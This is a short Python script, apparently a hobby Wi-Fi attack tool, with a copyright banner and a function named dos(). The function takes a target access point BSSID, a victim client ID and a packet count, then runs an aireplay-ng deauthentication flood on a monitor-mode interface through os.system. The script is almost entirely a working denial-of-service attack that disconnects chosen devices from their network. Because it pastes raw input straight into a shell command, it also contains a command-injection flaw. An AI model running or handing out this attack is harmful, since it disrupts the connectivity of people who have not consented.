import argparse
import os
from deauth_txt import deauth_txt
deauth_txt()
print("\n****************************************************************")
print("\n* Copyright of saai jeshwanth && nithesh, 2021 *")
print("\n****************************************************************")
def dos():

    bssid = input("enter the bssid :")
    victim= input("enter the victim-id :")
    count = input("enter no.of packet to send :")
    os.system(" aireplay-ng --deauth " +  count + " -a " + bssid + " -c " + victim + " wlan0mon ")
    
    

